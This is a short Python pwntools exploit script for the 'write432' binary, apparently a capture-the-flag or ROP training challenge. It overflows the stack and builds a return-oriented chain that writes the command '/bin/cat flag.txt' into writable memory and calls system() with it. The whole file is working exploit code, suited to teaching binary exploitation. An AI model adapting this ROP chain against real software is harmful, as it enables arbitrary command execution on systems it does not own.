import struct
from pwn import *
from GizmoMaker import GizmoMaker


popper = 0x80486da  # 0x80486da:  pop edi; pop ebp; ret;
mover = 0x8048670  # 0x8048670:  mov dword ptr [edi], ebp; ret;
system = 0x08048430  # Address of system@plt
gizmo_maker = GizmoMaker(packer=p32)
write_template = gizmo_maker.get_template_template()

write_template["name"] = "arbitrary_write"
write_template["Constants"] = ["popper", "mover"]
write_template["Parameters"] = ["write_addr", "value"]
write_template["Queue"] = ["popper",
                           "write_addr",
                           "value",
                           "mover"]
gizmo_maker.add_template(write_template)
gizmo_maker.init_template("arbitrary_write", popper, mover)

system_call_template = gizmo_maker.get_template_template()
system_call_template["name"] = "call_system"
system_call_template["Constants"] = ["system"]
system_call_template["Parameters"] = ["Junk", "command_addr"]
system_call_template["Queue"] = ["system", "Junk", "command_addr"]

gizmo_maker.add_template(system_call_template)
gizmo_maker.init_template("call_system", system)

e = ELF("write432")
command_addr = e.bss()  # just setting this to an area that should be empty and writable

payload = ('D'*40).encode()
payload += 'BBBB'.encode()

command = r"/bin/cat flag.txt"
n = 4
l = len(command) 
for i in range(0, l, n): 
    hexed = command[i:min(i + n, l)]
    write_addr = command_addr + i
    value = int("0x" + "".join([hex(ord(character))[2:] for character in hexed[::-1]]), 0)
    payload += gizmo_maker.execute("arbitrary_write", write_addr, value)

payload += gizmo_maker.execute("call_system", 0x4a4a4a4a, command_addr)
payload += '\n'.encode()

p = tubes.process.process(["./write432"], shell=True)
p.send_raw(payload)
p.interactive()
p.close()
